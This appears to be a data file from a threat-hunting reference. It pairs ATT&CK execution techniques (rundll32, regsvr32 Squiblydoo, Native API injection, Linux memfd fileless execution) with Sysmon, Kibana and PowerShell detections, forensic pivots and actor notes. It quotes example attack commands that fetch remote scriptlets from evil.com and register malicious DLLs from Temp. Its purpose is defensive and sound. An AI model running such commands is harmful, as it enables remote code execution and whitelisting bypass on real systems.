        sysmon: `EventID=1
Image=*\\rundll32.exe
CommandLine="rundll32.exe" OR CommandLine="C:\\Windows\\System32\\rundll32.exe"
  (no arguments after the binary name)

// Legitimate rundll32 is always fire-and-forget with
// arguments. rundll32 running with no arguments is
// almost always either:
// 1. A process hollow target (adversary creates the
//    process suspended, replaces memory, resumes it)
// 2. A long-running injection host (adversary injects
//    shellcode into it for stealth)`,
        kibana: `// rundll32 with empty / no-argument command line
winlog.event_id: 1
AND process.name: "rundll32.exe"
AND (
  process.command_line: "rundll32.exe"
  OR process.command_line: "C:\\\\Windows\\\\System32\\\\rundll32.exe"
  OR process.command_line: "C:\\\\Windows\\\\SysWOW64\\\\rundll32.exe"
  OR NOT process.command_line: *
)`,
        powershell: `# Hunt for rundll32 with no arguments
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*\\rundll32.exe' -and (
    -not $_.Properties[10].Value -or
    $_.Properties[10].Value -match '^"?[A-Za-z:\\\\]*rundll32\.exe"?\s*$'
  )
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending

# Cross-reference with EID 8 - was a remote thread
# injected into this rundll32 process?
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=8
} | Where-Object {
  $_.Properties[6].Value -like '*\\rundll32.exe'
} | Select TimeCreated,
  @{n='SourceImage';e={($_.Properties[4].Value -split '\\\\')[-1]}},
  @{n='TargetImage';e={'rundll32.exe'}},
  @{n='StartModule';e={$_.Properties[8].Value}}`,
        registry: `No file artifact - this is a memory-based technique.

Memory forensics for empty rundll32:
- Volatility plugins:
  - malfind: scans for injected code regions
    (RWX memory in rundll32 with PE/shellcode)
  - dlllist: legitimate rundll32 loads only the
    DLL specified on command line plus dependencies
    - empty rundll32 should have no extra DLLs
  - hollowfind: detects process hollowing artifacts

Live host triage:
- Get-Process rundll32 | Select Id, StartTime,
  MainModule, Modules
- Check loaded modules against expected baseline
  (legitimate empty rundll32 has very few modules)

Sysmon cross-references:
- EID 8 (CreateRemoteThread) targeting rundll32 PID
- EID 10 (ProcessAccess) with write access mask to rundll32
- These indicate injection occurred after the empty
  rundll32 was created`,
        tools: `Cobalt Strike default behavior:
- Cobalt Strike's "spawnto" setting defaults to
  rundll32.exe with no arguments for new process spawns
- This makes empty rundll32 a high-fidelity Beacon IOC
- Operators sometimes change spawnto for evasion

Other frameworks using empty rundll32 as injection host:
- Metasploit migrate command (rundll32 as target)
- Custom shellcode loaders
- Process hollowing implementations

Why rundll32 specifically:
- Signed Microsoft binary (trusted by default)
- Expected to run on any Windows system
- Has no expected long-running behavior (legitimate
  usage is fire-and-forget) so memory persistence
  is anomalous
- Loads minimal default DLLs - easier to inject
  into clean process state`,
        ossdetect: `Sigma:
- proc_creation_win_rundll32_no_arguments.yml
- proc_creation_win_rundll32_susp_no_args.yml
- sysmon_createremotethread_to_rundll32.yml

Atomic Red Team:
- T1218.011 (rundll32 variants)
- T1055.012 (Process Hollowing - related)
- T1055.001 (DLL Injection - related)

Hayabusa:
- Rundll32NoArgument detection rules
- High-fidelity for Cobalt Strike Beacon detection

Velociraptor:
- Windows.EventLogs.Sysmon (EID 1 + EID 8 correlation)
- Windows.Detection.Injection

Get-InjectedThread (Jared Atkinson):
- Scans live processes for threads with start
  addresses in unattributed memory
- Catches rundll32 injection cases that bypass
  Sysmon EID 8 (some advanced injection methods
  don't generate EID 8)`,
        notes: "rundll32.exe with no command-line arguments is one of the highest-fidelity Cobalt Strike Beacon indicators in default configurations. Cobalt Strike's spawnto setting defaults to rundll32 with no arguments because rundll32 is signed, ubiquitous, and unexpected to run long-term - exactly what an adversary wants in an injection host. Legitimate rundll32 invocations always carry arguments (the DLL path and export function); empty rundll32 has effectively zero legitimate use cases. Sophisticated operators change Cobalt Strike's spawnto to a different binary (notepad.exe, conhost.exe, etc.) for evasion - the broader detection technique is signed Microsoft binaries running unexpectedly long with no arguments, but rundll32 specifically remains the most common default. Pair with Sysmon EID 8 (CreateRemoteThread targeting rundll32) and EID 10 (ProcessAccess with write masks to rundll32) for the full injection chain: empty rundll32 spawn followed by remote thread injection from the parent or another process = Cobalt Strike spawnto pattern.",
        apt: [
          { cls: "apt-mul", name: "Cobalt Strike", note: "Default spawnto behavior - empty rundll32 is the classic Cobalt Strike Beacon process indicator." },
          { cls: "apt-ru", name: "APT29", note: "Cobalt Strike usage with default spawnto documented in SolarWinds and other operations." },
          { cls: "apt-mul", name: "Ransomware", note: "Cobalt Strike Beacon use across ransomware operations means empty rundll32 is a common ransomware staging indicator." },
          { cls: "apt-cn", name: "APT41", note: "Cobalt Strike and custom rundll32-based injection documented across operations." },
          { cls: "apt-mul", name: "Red Teams", note: "Default Cobalt Strike configurations make this a near-universal red team operator IOC." }
        ],
        cite: "MITRE ATT&CK T1218.011, T1055"
      }
    ]
  },
  {
    id: "T1218.010",
    name: "System Binary Proxy Execution: Regsvr32",
    desc: "regsvr32.exe Squiblydoo technique, scriptlet abuse, AppLocker bypass",
    rows: [
      {
        sub: "T1218.010 - Squiblydoo (Remote Scriptlet Execution)",
        os: "win",
        indicator: "regsvr32.exe with /i: flag pointing to remote URL and scrobj.dll - classic Casey Smith Squiblydoo AppLocker bypass",
        sysmon: `EventID=1
Image=*\\regsvr32.exe
CommandLine matches:
  *scrobj.dll* AND (*http://* OR *https://* OR *\\\\\\\\*)

// Also catch the simpler /i: with URL pattern:
EventID=1
Image=*\\regsvr32.exe
CommandLine matches: */i:http://* OR */i:https://*

// Network connection from regsvr32:
EventID=3
Image=*\\regsvr32.exe
DestinationPort=80 OR 443 OR 8080`,
        kibana: `// Primary: Squiblydoo pattern
winlog.event_id: 1
AND process.name: "regsvr32.exe"
AND process.command_line: *scrobj.dll*
AND process.command_line: (*http\:\/\/* OR *https\:\/\/* OR *\\\\\\\\*)

// Broader /i: URL pattern (Squiblytwo variants)
winlog.event_id: 1
AND process.name: "regsvr32.exe"
AND process.command_line: (*\/i\:http* OR *\/i\:https*)

// Supplementary: regsvr32 making HTTP connections
winlog.event_id: 3
AND process.name: "regsvr32.exe"
AND destination.port: (80 OR 443 OR 8080)`,
        powershell: `# Hunt for Squiblydoo and variants
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*\\regsvr32.exe' -and (
    # Classic Squiblydoo with scrobj.dll + URL
    ($_.Properties[10].Value -match 'scrobj\.dll' -and
     $_.Properties[10].Value -match '(http://|https://|\\\\\\\\)') -or
    # Simpler /i: URL variant
    $_.Properties[10].Value -match '/i:(http|https)://'
  )
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending

# Supplementary: regsvr32 outbound network
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=3
} | Where-Object {
  $_.Properties[4].Value -like '*\\regsvr32.exe'
} | Select TimeCreated,
  @{n='DestIP';e={$_.Properties[14].Value}},
  @{n='DestHost';e={$_.Properties[15].Value}},
  @{n='DestPort';e={$_.Properties[16].Value}}`,
        registry: `regsvr32.exe location (legitimate):
- C:\\Windows\\System32\\regsvr32.exe
- C:\\Windows\\SysWOW64\\regsvr32.exe

scrobj.dll location (legitimate):
- C:\\Windows\\System32\\scrobj.dll
  (Microsoft Script Component Runtime - signed)

Scriptlet (.sct) content - if downloaded to cache:
- IE/WinINet cache:
  %LOCALAPPDATA%\\Microsoft\\Windows\\
    INetCache\\IE\\<random>\\*.sct
- Scriptlets are XML files containing inline
  VBScript or JScript - inspect with text editor

The .sct file format:
<?XML version="1.0"?>
<scriptlet>
  <registration ...>
    <script language="JScript">
      <![CDATA[
        // attacker code here
      ]]>
    </script>
  </registration>
</scriptlet>

Investigation pivots:
- Sysmon EID 3 (network) reveals scriptlet URL
- Child processes of regsvr32 reveal what the
  scriptlet ultimately spawned
- Decode any base64 or obfuscated content in
  the scriptlet for true intent`,
        tools: `Casey Smith (subTee) original research (2016):
- "Bypassing AppLocker / Application Whitelisting
  with regsvr32" - the original Squiblydoo writeup
- Demonstrated that regsvr32 + scrobj.dll + URL
  bypasses most AppLocker default configurations

The name "Squiblydoo" comes from the technique pair:
- Squiblydoo = regsvr32 abuse (this technique)
- Squiblytwo = wmic /format: abuse (a related variant)

Used by:
Cobalt Strike (Squiblydoo payload generation)
Empire (regsvr32 stagers)
Metasploit modules
Custom phishing payloads
DotNetToJScript scriptlet generators
Various commodity malware loader chains

LOLBAS reference:
- lolbas-project.github.io/lolbas/Binaries/Regsvr32/
- Documents Squiblydoo and other regsvr32 variants

Common Squiblydoo command lines:
- regsvr32 /s /n /u /i:http://evil.com/x.sct scrobj.dll
- regsvr32 /s /i:http://evil.com/x.sct scrobj.dll
- regsvr32.exe /u /n /s /i:https://evil.com/x scrobj.dll`,
        ossdetect: `Sigma:
- proc_creation_win_regsvr32_squiblydoo.yml
- proc_creation_win_regsvr32_remote_scriptlet.yml
- network_connection_win_regsvr32.yml

Atomic Red Team:
- T1218.010 Test #1 (Squiblydoo - remote .sct)
- T1218.010 Test #2 (Squiblydoo - local .sct)

Hayabusa:
- Squiblydoo detection rules
- RegSvr32RemoteUrl rules
- High-fidelity (no legitimate use case)

Velociraptor:
- Windows.EventLogs.Sysmon
- Windows.Forensics.SRUM (network connections per process)

LOLBAS project:
- lolbas-project.github.io/lolbas/Binaries/Regsvr32/

Casey Smith (subTee):
- Original Squiblydoo research and PoCs
- Foundational reference for LOLBin abuse category`,
        notes: "Squiblydoo is one of the most well-documented LOLBin techniques and remains effective in environments where AppLocker or WDAC has not been specifically tuned to block regsvr32 with remote scriptlet arguments. The technique works because regsvr32.exe is Microsoft-signed, scrobj.dll is Microsoft-signed, and the inline scriptlet content runs inside regsvr32's process context - none of the default Application Whitelisting checks catch this chain. The detection is high-fidelity because legitimate regsvr32 usage virtually never involves the /i: flag with a URL or scrobj.dll. The classic pattern is so distinctive (URL + scrobj.dll in the same command line) that a single Sysmon EID 1 rule with no further tuning catches the vast majority of Squiblydoo invocations. Worth noting: AppLocker can be specifically configured to block this technique by denying regsvr32 outbound network access or denying scrobj.dll specifically - but most environments don't do this by default. The technique pre-dates ATT&CK itself and Casey Smith's 2016 disclosure remains the canonical reference.",
        apt: [
          { cls: "apt-mul", name: "Casey Smith Research", note: "Original Squiblydoo disclosure, 2016 - foundational LOLBin abuse research." },
          { cls: "apt-cn", name: "APT32", note: "Squiblydoo-style regsvr32 abuse documented in Southeast Asian operations." },
          { cls: "apt-mul", name: "Commodity Malware", note: "Trickbot, IcedID, and various loaders have used regsvr32-based delivery." },
          { cls: "apt-mul", name: "Red Teams", note: "Squiblydoo remains a standard LOLBin demonstration in red team toolkits." },
          { cls: "apt-mul", name: "Phishing Operators", note: "Remote scriptlet execution via regsvr32 documented across multiple commodity phishing campaigns." }
        ],
        cite: "MITRE ATT&CK T1218.010"
      },
      {
        sub: "T1218.010 - regsvr32.exe Loading DLL from Suspicious Path",
        os: "win",
        indicator: "regsvr32.exe registering or unregistering a DLL from user-writable path - non-Squiblydoo abuse pattern",
        sysmon: `EventID=1
Image=*\\regsvr32.exe
CommandLine matches:
  *\\AppData\\* OR *\\Temp\\*
  OR *\\ProgramData\\* OR *\\Users\\Public\\*
  OR *\\Downloads\\*
AND CommandLine does NOT match: *scrobj.dll*
  (Squiblydoo covered in previous indicator)

// Unsigned DLL loaded by regsvr32:
EventID=7 (Image Load)
Image=*\\regsvr32.exe
Signed=false`,
        kibana: `// regsvr32 with DLL in suspicious path (excluding Squiblydoo)
winlog.event_id: 1
AND process.name: "regsvr32.exe"
AND process.command_line: (*\\AppData\\* OR *\\Temp\\* OR *\\ProgramData\\* OR *\\Public\\* OR *\\Downloads\\*)
AND NOT process.command_line: *scrobj.dll*

// Unsigned DLL loaded by regsvr32 (EID 7)
winlog.event_id: 7
AND process.name: "regsvr32.exe"
AND file.code_signature.signed: false`,
        powershell: `# Hunt for regsvr32 loading DLLs from suspicious paths
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  $_.Properties[4].Value -like '*\\regsvr32.exe' -and
  $_.Properties[10].Value -match
    '(AppData|Temp|ProgramData|Public|Downloads)' -and
  $_.Properties[10].Value -notmatch 'scrobj\.dll'
} | Select TimeCreated,
  @{n='CmdLine';e={$_.Properties[10].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}} |
  Sort-Object TimeCreated -Descending

# Unsigned DLLs loaded by regsvr32 (EID 7)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=7
} | Where-Object {
  $_.Properties[4].Value -like '*\\regsvr32.exe' -and
  $_.Properties[13].Value -eq 'false'
} | Select TimeCreated,
  @{n='LoadedDLL';e={$_.Properties[5].Value}},
  @{n='Signed';e={$_.Properties[13].Value}}`,
        registry: `COM registration artifacts (regsvr32 default behavior):
- regsvr32 calls DllRegisterServer in the target DLL
- DllRegisterServer typically writes COM registration
  data to:
  HKLM\\SOFTWARE\\Classes\\CLSID\\{GUID}\\
  HKCR\\CLSID\\{GUID}\\
  HKCR\\<ProgID>\\
- A malicious DLL's DllRegisterServer may instead
  (or also) execute attacker code

Hunt for unusual COM registrations:
Get-ChildItem HKLM:\\SOFTWARE\\Classes\\CLSID\\ |
  Where-Object {
    $ip = (Get-ItemProperty $_.PSPath -Name InprocServer32 -EA SilentlyContinue).'(default)'
    $ip -match '(AppData|Temp|ProgramData)'
  }

DLL on disk - primary forensic artifact:
- Inspect the DLL in the regsvr32 command line
- Check signature, entropy, exports
- DllRegisterServer / DllUnregisterServer are the
  conventional entry points - check if these
  contain unusual code (not just COM registration)`,
        tools: `Beyond Squiblydoo - other regsvr32 abuse:
- Direct DLL registration with malicious DllRegisterServer:
  regsvr32 C:\\Temp\\malicious.dll
  (calls DllRegisterServer which may execute arbitrary code)
- /u flag to unregister - same execution path:
  regsvr32 /u C:\\Temp\\malicious.dll
  (calls DllUnregisterServer)
- Local .sct execution (no remote URL):
  regsvr32 /s /i:C:\\Temp\\local.sct scrobj.dll
  (Squiblydoo-style but with local file)

Used by:
Commodity malware loaders (various families)
Custom payloads requiring COM registration
Some legitimate vendor installers (false positive source)
Cobalt Strike (regsvr32-based payload generation)

LOLBAS reference:
- lolbas-project.github.io/lolbas/Binaries/Regsvr32/`,
        ossdetect: `Sigma:
- proc_creation_win_regsvr32_susp_dll_path.yml
- proc_creation_win_regsvr32_dll_from_user_path.yml
- image_load_win_regsvr32_unsigned_dll.yml

Atomic Red Team:
- T1218.010 Test #3 (regsvr32 local DLL registration)
- T1218.010 Test #4 (regsvr32 unsigned DLL)

Hayabusa:
- Regsvr32SuspDllPath rules
- Regsvr32UnsignedDll detection

Velociraptor:
- Windows.EventLogs.Sysmon
- Windows.System.DLL`,
        notes: "This indicator complements the Squiblydoo detection by covering the other regsvr32 abuse patterns - local DLL registration with a malicious DllRegisterServer, /u unregistration as an execution trigger, and local scriptlet execution without remote fetch. The detection is path-focused: legitimate regsvr32 calls load DLLs from System32, SysWOW64, or known vendor program directories. Regsvr32 loading a DLL from AppData, Temp, ProgramData, or Public is high-confidence malicious. The unsigned DLL angle via Sysmon EID 7 is a useful complement. False positive consideration: some legitimate software installers use regsvr32 with DLLs from their installation directories (rarely from temp paths) - build allowlists from installer baselines. The /u flag deserves specific attention: adversaries sometimes use unregistration as the execution vector because it's slightly less monitored than registration, but both call into attacker-controlled DLL code.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Regsvr32-based DLL execution documented across multiple sector operations." },
          { cls: "apt-ru", name: "APT28", note: "Regsvr32 abuse with malicious DLLs documented in spearphishing operations." },
          { cls: "apt-mul", name: "Commodity Malware", note: "Various loader families use regsvr32 for COM-registered or direct DLL execution." },
          { cls: "apt-mul", name: "Ransomware", note: "Regsvr32-based execution documented in some ransomware staging chains." },
          { cls: "apt-mul", name: "Red Teams", note: "Non-Squiblydoo regsvr32 abuse is standard LOLBin tradecraft." }
        ],
        cite: "MITRE ATT&CK T1218.010"
      }
    ]
  },
  {
    id: "T1106",
    name: "Native API",
    desc: "Direct API calls bypassing CLI - process creation without command-line context",
    rows: [
      {
        sub: "T1106 - Native API Process Creation and Memory Injection Artifacts",
        os: "win",
        indicator: "Process spawned with empty command line, suspicious cross-process memory access, or remote thread injection - Native API execution bypassing Win32 layer",
        sysmon: `// Three Sysmon event IDs cover Native API abuse:

// EID 1 - Process creation with empty/missing CommandLine:
EventID=1
CommandLine="" OR CommandLine IS NULL
// Legitimate processes rarely have empty command lines.
// Exceptions: some system processes (smss.exe, csrss.exe)
// Flag when: standard user-space processes appear
// with no command line context

// EID 8 - CreateRemoteThread (cross-process injection):
EventID=8
// All fields relevant - no filtering needed initially.
// Key fields:
//   SourceImage = injecting process
//   TargetImage = process being injected into
//   StartAddress = memory address of injected thread
//   StartModule  = DLL containing start address
//     (blank StartModule = shellcode, not a known DLL)
//   StartFunction = function name if resolvable

// EID 10 - ProcessAccess (handle to another process):
EventID=10
GrantedAccess=0x1fffff
  OR GrantedAccess=0x1f0fff
  OR GrantedAccess=0x143a
// These access masks include PROCESS_VM_WRITE +
// PROCESS_VM_OPERATION - required for memory injection
// TargetImage=*\\lsass.exe is a separate high-value alert
// (credential access - covered in Credential Access tactic)`,
        kibana: `// EID 1: Process with empty command line
winlog.event_id: 1
AND NOT process.command_line: *
AND NOT process.name: ("smss.exe" OR "csrss.exe" OR "wininit.exe" OR "services.exe")

// EID 8: Remote thread injection - blank StartModule = shellcode
winlog.event_id: 8
AND NOT winlog.event_data.StartModule: *

// EID 8: Remote thread into sensitive targets
winlog.event_id: 8
AND winlog.event_data.TargetImage: ("*\\lsass.exe" OR "*\\svchost.exe" OR "*\\explorer.exe" OR "*\\notepad.exe")

// EID 10: Suspicious cross-process handle with write access
winlog.event_id: 10
AND winlog.event_data.GrantedAccess: ("0x1fffff" OR "0x1f0fff" OR "0x143a")
AND NOT winlog.event_data.SourceImage: ("*\\MsMpEng.exe" OR "*\\svchost.exe" OR "*\\csrss.exe")`,
        powershell: `# Hunt for EID 8 - CreateRemoteThread with no StartModule (shellcode indicator)
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=8
} | Where-Object {
  # Blank StartModule = thread start address not in any known DLL
  -not $_.Properties[8].Value
} | Select TimeCreated,
  @{n='SourceImage';e={($_.Properties[4].Value -split '\\\\')[-1]}},
  @{n='TargetImage';e={($_.Properties[6].Value -split '\\\\')[-1]}},
  @{n='StartAddress';e={$_.Properties[10].Value}},
  @{n='StartModule';e={$_.Properties[8].Value}},
  @{n='StartFunction';e={$_.Properties[9].Value}} |
  Sort-Object TimeCreated -Descending

# Hunt for EID 10 - suspicious cross-process memory access
$suspiciousAccess = @('0x1fffff','0x1f0fff','0x143a','0x40','0x1410')
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=10
} | Where-Object {
  $access = $_.Properties[8].Value
  $suspiciousAccess -contains $access -and
  # Exclude known-good sources
  $_.Properties[4].Value -notmatch '(MsMpEng|svchost|csrss|lsass|werfault)\.exe'
} | Select TimeCreated,
  @{n='SourceImage';e={($_.Properties[4].Value -split '\\\\')[-1]}},
  @{n='TargetImage';e={($_.Properties[6].Value -split '\\\\')[-1]}},
  @{n='GrantedAccess';e={$_.Properties[8].Value}} |
  Sort-Object TimeCreated -Descending

# Hunt for EID 1 - processes with empty command line
$knownNoCLI = @('smss.exe','csrss.exe','wininit.exe','services.exe','lsass.exe')
Get-WinEvent -FilterHashtable @{
  LogName='Microsoft-Windows-Sysmon/Operational';
  ID=1
} | Where-Object {
  -not $_.Properties[10].Value -and
  $knownNoCLI -notcontains ($_.Properties[4].Value -split '\\\\')[-1]
} | Select TimeCreated,
  @{n='Image';e={$_.Properties[4].Value}},
  @{n='Parent';e={($_.Properties[20].Value -split '\\\\')[-1]}},
  @{n='User';e={$_.Properties[12].Value}}`,
        registry: `No direct registry artifact from Native API execution.

Native API calls operate entirely in memory - the
execution path bypasses the filesystem artifacts
that most other techniques leave behind.

Indirect forensic artifacts to investigate:
- Memory forensics (most reliable for Native API):
  Volatility / Rekall plugins:
  - malfind: scans for injected code regions
    (RWX memory pages with PE headers or shellcode)
  - dlllist: lists loaded modules per process
    (compare against expected DLLs for that process)
  - cmdline: dumps command lines from PEB structure
    (if empty for a user-space process = anomaly)
  - handles: open handles per process

- Sysmon EID 7 (Image Load) context:
  Watch for ntdll.dll loaded into unexpected processes,
  or unusual DLLs appearing in memory of known-good
  processes shortly before EID 8/10 events

- Process hollowing artifact:
  SectionObjectPointers divergence in memory -
  detectable via Get-InjectedThread (PowerShell tool)
  or process memory scanners`,
        tools: `Native API functions commonly abused:
- NtCreateProcess / NtCreateProcessEx
  (process creation without Win32 CreateProcess)
- NtAllocateVirtualMemory + NtWriteVirtualMemory
  (allocate + write shellcode to remote process)
- NtCreateThreadEx / RtlCreateUserThread
  (thread creation in remote process)
- NtMapViewOfSection
  (map shared memory section into target process)
- NtQueueApcThread
  (queue APC - Asynchronous Procedure Call - for injection)

Frameworks using Native API:
Cobalt Strike (multiple injection techniques)
Metasploit (meterpreter injection)
Sliver C2 (process injection modules)
Donut (shellcode generator - produces Native API stagers)
Syswhispers / Syswhispers2 / Syswhispers3
  (toolkits for making direct syscalls, bypassing
  ntdll.dll hooks by going straight to kernel)
HellsGate / HalosGate (syscall bypass techniques)

Syscall-level evasion note: the most advanced
adversaries don't just call ntdll.dll Native API -
they use direct syscalls (int 2e / syscall instruction)
to bypass ntdll.dll entirely, defeating EDR hooks
placed there. Detection at that level requires
kernel-mode visibility (ETW, kernel sensors).`,
        ossdetect: `Sigma:
- proc_creation_win_susp_empty_commandline.yml
- sysmon_createremotethread_win_susp.yml (EID 8)
- sysmon_proc_access_win_susp_access_mask.yml (EID 10)
- sysmon_createremotethread_win_shellcode.yml
  (EID 8 with blank StartModule)

Atomic Red Team:
- T1106 (Native API process creation tests)
- T1055 (Process Injection - overlapping technique)

Hayabusa:
- CreateRemoteThread detection rules (EID 8)
- SuspiciousProcessAccess rules (EID 10)

Velociraptor:
- Windows.Detection.Injection
  (combines EID 8 + EID 10 + memory scanning)
- Windows.Memory.Acquisition (full memory capture)

Dedicated injection detection tools:
- Get-InjectedThread (PowerShell, Jared Atkinson)
  Scans running processes for injected threads
  by checking thread start address against
  known module ranges - shellcode threads have
  start addresses in unattributed memory regions
- PE-sieve (hasherezade) - process memory scanner`,
        notes: "T1106 is the most detection-resistant technique in the Execution tactic because its entire value to an adversary is avoiding the artifacts that other techniques generate. The three Sysmon event IDs here (1, 8, 10) are the best available host-side telemetry, but each has significant false-positive challenges that require careful tuning. EID 8 (CreateRemoteThread) is the most actionable: legitimate software rarely injects threads into other processes, and a CreateRemoteThread event where StartModule is blank almost always indicates shellcode rather than a legitimate DLL-based operation. EID 10 (ProcessAccess) with write-capable access masks is noisier - AV and EDR products themselves open handles to other processes for scanning, so source-image allowlisting is essential. The empty command line on EID 1 is worth monitoring but generates false positives from some legitimate system processes and certain vendor software that uses Win32 CreateProcess with a NULL lpCommandLine argument. The honest detection gap to acknowledge: the most sophisticated operators use direct syscalls (Syswhispers-style) to bypass even ntdll.dll, making user-mode detection insufficient. Kernel-mode ETW (Event Tracing for Windows) sensors in modern EDR products are the frontier for that level of evasion. For most environments and most adversaries, the Sysmon EID 8 blank-StartModule detection is the highest-value single alert in this indicator.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Process injection via Native API documented across multiple long-dwell espionage operations." },
          { cls: "apt-cn", name: "APT41", note: "Native API injection techniques documented in operations targeting multiple sectors." },
          { cls: "apt-mul", name: "Cobalt Strike", note: "Multiple Native API injection techniques (CreateRemoteThread, NtMapViewOfSection, APC) built into Beacon." },
          { cls: "apt-mul", name: "Ransomware", note: "Process injection for AV evasion documented across Conti, BlackCat, and other ransomware families." },
          { cls: "apt-mul", name: "Red Teams", note: "Direct syscall techniques (Syswhispers, HellsGate) are standard modern red team evasion tradecraft." }
        ],
        cite: "MITRE ATT&CK T1106, T1055"
      },
      {
        sub: "T1106 - Linux Fileless Execution (memfd_create / execve from anonymous fd)",
        os: "linux",
        indicator: "Execution from an anonymous in-memory file (memfd) or a process whose backing executable has been deleted - fileless execution via memfd_create + execve, leaving no on-disk binary",
        sysmon: `// Sysmon for Linux ProcessCreate (EID 1)
EventID=1
Image matches an anonymous/deleted backing file:
  /memfd:*  (anonymous memory file descriptor)
  OR *(deleted) in the resolved image path
CurrentDirectory / parentage may look normal - the tell
  is the in-memory or unlinked image source.

// memfd_create is a syscall - best captured by auditd
// (see Auditd/Shell) or eBPF tooling; Sysmon for Linux
// surfaces the resulting exec with a /memfd: image path.`,
        kibana: `// Execution from an anonymous memory fd or deleted binary
process.executable: ("/memfd:*" OR *"(deleted)"*)

// Process exe path under /proc that resolves to memfd
process.name: *
AND process.executable: "/memfd:*"

// auditd: execve where the path is an anonymous fd
auditd.data.syscall: "execve"
AND process.executable: ("/memfd:*" OR *memfd*)

// Correlate: a downloader (curl/wget) with NO subsequent
// file write but a new process from /memfd: shortly after`,
        powershell: `# (Auditd / Shell hunt - Linux row)

# Hunt running processes executing from memfd or a deleted file
for p in $(ls /proc | grep -E '^[0-9]+$'); do
  exe=$(ls -l /proc/$p/exe 2>/dev/null)
  echo "$exe" | grep -qE 'memfd:|\\(deleted\\)' && \\
    echo "PID $p : $(cat /proc/$p/comm 2>/dev/null) : $exe"
done

# auditd rule to catch memfd_create + execve:
#   -a always,exit -F arch=b64 -S memfd_create -k fileless
#   -a always,exit -F arch=b64 -S execve -F exe=/memfd: -k fileless
ausearch -k fileless -i 2>/dev/null

# List anonymous memory-backed files held open by processes
ls -l /proc/*/exe 2>/dev/null | grep -E 'memfd:|deleted'

# Cross-check: recently-spawned processes with no on-disk path
for p in $(ls /proc | grep -E '^[0-9]+$'); do
  if readlink /proc/$p/exe 2>/dev/null | grep -q 'memfd\\|deleted'; then
    echo "=== PID $p ==="; tr '\\0' ' ' < /proc/$p/cmdline; echo
  fi
done`,
        registry: `(File Artifacts - Linux row)

No registry, and by design almost no on-disk artifact -
that's the point of fileless execution. What evidence
exists lives in memory / /proc:

Process evidence (the only reliable surface):
  /proc/<pid>/exe -> '/memfd:<name> (deleted)' or
    '<path> (deleted)' - the defining indicator
  /proc/<pid>/maps - the executable region backed by an
    anonymous mapping rather than a file
  /proc/<pid>/cmdline , /proc/<pid>/environ
  /proc/<pid>/fd - may show the memfd file descriptor

memfd_create mechanics:
  - memfd_create() makes an anonymous file in RAM
  - the payload is written to that fd, then execve'd
  - nothing ever touches the filesystem
  - common in Linux malware loaders, ELF-in-memory
    runners (e.g. ddexec, in-memory ELF loaders)

Investigation pivots:
- The '(deleted)' or '/memfd:' image path is the highest-
  fidelity single indicator of fileless execution
- Capture process memory (/proc/<pid>/mem via gcore, or
  the memfd content) for the payload before the process
  exits - it's gone on termination
- Pairs with a download step that left no file on disk`,
        tools: `memfd_create-based ELF loaders (ddexec, fileless ELF
  runners, memrun-style tooling)
Metasploit - Linux meterpreter in-memory execution
Sliver / Mythic - fileless Linux stager options
DDexec / EzuriLoader (ELF crypter+memory loader)
Manual operators - 'fileless ELF' via memfd is an
  increasingly common EDR-evasion step on Linux
GTFOBins - some entries enable in-memory exec chains`,
        ossdetect: `Sigma (Linux rules):
- lnx_auditd_memfd_create_execution.yml
- lnx_proc_exe_deleted_binary.yml

Atomic Red Team:
- T1106 (native API / fileless execution tests)

Auditd:
- memfd_create + execve syscall rules (-k fileless)

Sysmon for Linux:
- ProcessCreate (EID 1) surfaces /memfd: image paths

eBPF tooling (strongest for this):
- Falco ("Fileless execution via memfd_create" rule)
- Tetragon / Tracee - syscall-level memfd + exec detection
- These see the syscall directly, before the exec resolves

Velociraptor:
- Linux process artifacts flagging deleted/memfd exe links`,
        notes: "This is the Linux counterpart to the Windows Native API row, and it centers on fileless execution via memfd_create - the dominant Linux EDR-evasion execution technique. The mechanism: memfd_create() creates an anonymous file that exists only in RAM, the payload (typically an ELF) is written to that file descriptor, and execve runs it directly - nothing ever touches disk, so file-based AV and integrity monitoring see nothing. The defining, highest-fidelity indicator is a process whose /proc/<pid>/exe symlink resolves to '/memfd:...' or shows '(deleted)' - that single check catches the overwhelming majority of fileless Linux execution and is trivially scriptable across /proc. Because syscall visibility is what really nails this, eBPF tooling (Falco, Tetragon, Tracee) is the strongest detector - they see the memfd_create and execve syscalls directly, before the exec resolves; auditd with memfd_create+execve rules is the next best and works without eBPF. Sysmon for Linux surfaces the resulting exec with a /memfd: image path. Critical IR note: the payload lives only in memory and vanishes when the process exits, so if you find one, capture the memfd content or process memory (gcore, /proc/<pid>/mem) immediately - there's no on-disk copy to recover later. This frequently pairs with a download step that deliberately left no file (curl piped straight into a memory loader), so correlate with network egress that has no matching file write.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "In-memory ELF execution and fileless loaders used to evade Linux EDR." },
          { cls: "apt-kp", name: "Lazarus", note: "Fileless Linux payloads documented in supply-chain and financial intrusions." },
          { cls: "apt-mul", name: "TeamTNT", note: "memfd-based fileless execution adopted in Linux cryptojacking toolkits to evade detection." },
